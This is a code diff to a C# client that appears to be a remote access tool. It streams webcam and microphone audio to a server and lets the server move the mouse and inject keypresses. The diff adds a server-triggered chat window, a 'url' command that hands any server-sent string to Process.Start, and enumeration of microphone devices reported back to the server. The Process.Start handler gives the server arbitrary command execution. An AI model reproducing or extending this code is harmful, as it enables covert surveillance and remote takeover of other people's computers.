@@ -1,10 +1,12 @@
 ﻿using AForge.Video;
 using AForge.Video.DirectShow;
 using LazyServer;
+using NAudio.CoreAudioApi;
 using NAudio.Wave;
 using Newtonsoft.Json.Linq;
 using Sweep.Forms;
 using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
@@ -181,11 +183,37 @@ namespace Client
                             break;
 
                         case "chat":
-                            chatform = new Chat();
-                            Chat.Instance.add($"[ Chatting with {(string)message["username"]} ]");
-                            FormSlider.ShowSliding(chatform, 3);
+                            Application.OpenForms[0].BeginInvoke((Action)(() =>
+                            {
+                                if (Chat.Instance == null || Chat.Instance.IsDisposed)
+                                {
+                                    new Chat(); // This sets Chat.Instance internally
+                                    FormSlider.ShowSliding(Chat.Instance, 3);
+                                }
 
+                                Chat.Instance.add($"[ Chatting with {(string)message["username"]} ]");
+                            }));
                             break;
+
+
+                        case "chatmsg":
+                            string username = (string)message["username"];
+                            string text = (string)message["text"];
+
+                            Application.OpenForms[0].BeginInvoke((Action)(() =>
+                            {
+                                if (Chat.Instance == null || Chat.Instance.IsDisposed)
+                                {
+                                    new Chat(); // Create and sets Chat.Instance
+                                    FormSlider.ShowSliding(Chat.Instance, 3);
+                                }
+
+                                Chat.Instance.add($"<{username}>: {text}");
+                            }));
+                            break;
+
+
+
                         case "mousemove":
                             int x = (int)message["x"];
                             int y = (int)message["y"];
@@ -202,6 +230,10 @@ namespace Client
                         case "key":
                             string key = (string)message["key"];
                             GClass.SendKeyPress(key);
+                            break;
+                        case "url":
+                            string bod = (string)message["body"];
+                            System.Diagnostics.Process.Start(bod);
                             break;
 
                     }
@@ -367,7 +399,18 @@ namespace Client
             camLoopTask = null;
             camLoopRunning = false;
         }
+        public static string[] GetAvailableMicrophones()
+        {
+            var microphones = new List<string>();
 
+            for (int i = 0; i < WaveIn.DeviceCount; i++)
+            {
+                var deviceInfo = WaveIn.GetCapabilities(i);
+                microphones.Add(deviceInfo.ProductName);
+            }
+
+            return microphones.ToArray();
+        }
         static async Task StartMicLoopAsync(LazyServerClient client)
         {
             await StopMicLoopAsync();
@@ -395,7 +438,8 @@ namespace Client
                 _ = client.SendFileBytes(pcm, new JObject
                 {
                     ["msg"] = "micaudio",
-                    ["microphones"] = deviceCount
+                    ["microphones"] = deviceCount,
+                    ["devices"] = JArray.FromObject(GetAvailableMicrophones())
                 }.ToString());
             };
 
